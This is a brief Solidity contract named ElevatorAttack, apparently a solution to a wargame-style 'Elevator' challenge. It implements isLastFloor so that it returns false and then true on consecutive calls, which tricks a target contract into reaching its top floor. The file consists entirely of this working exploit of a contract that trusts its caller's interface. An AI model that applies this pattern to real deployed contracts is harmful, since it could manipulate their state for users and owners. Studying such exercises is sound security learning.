// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IElevator {
    function goTo(uint) external;
}

contract ElevatorAttack {
    IElevator elevator;
    bool public _top;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() external {
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns(bool) {
        if(!_top) {
            _top = true;
            return false;
        } else {
            _top = false;
            return true;
        }
    }
}